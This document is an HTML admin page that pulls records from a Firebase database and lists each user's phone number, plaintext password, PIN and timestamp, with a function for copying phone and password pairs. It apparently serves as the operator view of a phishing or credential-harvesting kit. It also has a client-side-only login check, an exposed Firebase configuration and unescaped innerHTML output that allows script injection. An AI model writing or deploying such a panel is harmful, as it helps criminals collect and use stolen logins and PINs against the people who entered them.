<!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Users List</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
font-family:'Poppins',sans-serif;
}

body{
background:#f4f4f4;
padding:20px;
}

.container{

max-width:1100px;
margin:auto;
background:#fff;
border-radius:18px;
padding:20px;
box-shadow:0 8px 30px rgba(0,0,0,.15);

}

.top{

display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:20px;
flex-wrap:wrap;
gap:10px;

}

.title{

font-size:28px;
font-weight:700;
color:#63d12f;

}

.search{

width:280px;
height:45px;
padding:0 15px;
border:2px solid #ddd;
border-radius:10px;
outline:none;

}

table{

width:100%;
border-collapse:collapse;

}

thead{

background:#63d12f;
color:#fff;

}

th,td{

padding:15px;
text-align:center;

}

tbody tr:nth-child(even){

background:#f9f9f9;

}

tbody tr:hover{

background:#eefbe6;

}

.copy{

background:#63d12f;
border:none;
padding:8px 18px;
color:white;
border-radius:8px;
cursor:pointer;

}

.copy:hover{

background:#4bb51f;

}

</style>

</head>

<body>

<script>

if(sessionStorage.getItem("admin")!="true"){

window.location="admin.html";

}

</script>

<div class="container">

<div class="top">

<div class="title">

Users List

</div>

<input

type="text"

id="search"

class="search"

placeholder="Search Phone Number">

</div>

<table>

<thead>

<tr>
  
<th>No.</th>
<th>Phone</th>
<th>Password</th>
<th>PIN</th>
<th>Time</th>

</tr>

</thead>

<tbody id="tbody">

  <script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
    getDatabase,
    ref,
    onValue
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCvUTcjYusi7eHGYUvYkeeTPwWhmVuw4wI",
  authDomain: "spro-deal-a87cd.firebaseapp.com",
  databaseURL: "https://spro-deal-a87cd-default-rtdb.firebaseio.com",
  projectId: "spro-deal-a87cd",
  storageBucket: "spro-deal-a87cd.firebasestorage.app",
  messagingSenderId: "881694010465",
  appId: "1:881694010465:web:a91f60a585b36447458e20",
  measurementId: "G-0KHC1X0DC6"
};

const app = initializeApp(firebaseConfig);

const db = getDatabase(app);

const tbody = document.getElementById("tbody");

onValue(ref(db,"users"),(snapshot)=>{

    tbody.innerHTML="";

    if(!snapshot.exists()){
        tbody.innerHTML="<tr><td colspan='5'>No Data Found</td></tr>";
        return;
    }

    const users = [];

    snapshot.forEach(child=>{

        users.push(child.val());

    });

    users.reverse();

    users.forEach((user, index) => {

        tbody.innerHTML += `

        <tr>
    <td>${index + 1}</td>
    <td>${user.phone}</td>
    <td>${user.password}</td>
    <td>${user.pin || "-"}</td>
    <td>${user.time}</td>
    <td>
        
    </td>
</tr>
        `;

    });

});

window.copyData=function(phone,password){

navigator.clipboard.writeText(

`Phone : ${phone}

Password : ${password}`

);

alert("Copied Successfully");

}

</script>

</tbody>

</table>

</div>
